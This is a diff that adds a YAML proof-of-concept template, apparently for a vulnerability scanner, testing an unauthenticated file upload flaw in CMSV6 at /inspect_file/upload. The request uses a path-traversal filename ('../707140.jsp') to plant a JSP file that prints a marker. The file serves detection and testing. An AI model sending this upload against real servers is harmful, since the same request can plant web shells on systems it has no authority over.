@@ -1,0 +1,18 @@
+name: poc-yaml-CMSV6-inspect-file-upload
+set:
+  rand: randomInt(200000000, 210000000)
+rules:
+  - method: POST
+    path: /inspect_file/upload
+    headers:
+      Content-Type: multipart/form-data; boundary=2e7688d712bcc913201f327059f9976b
+    body: >-
+      --2e7688d712bcc913201f327059f9976b
+      Content-Disposition: form-data; name="uploadFile"; filename="../707140.jsp"
+      Content-Type: application/octet-stream
+
+      <% out.println("007319607"); %>
+      --2e7688d712bcc913201f327059f9976b--
+    follow_redirects: false
+    expression: >
+      response.status == 200 && response.content_type.contains("Content-Type:application/json:charset=UF-8") && response.body_string.contains("OK") && response.body_string.contains("filePath") && response.body_string.contains('"result":0')
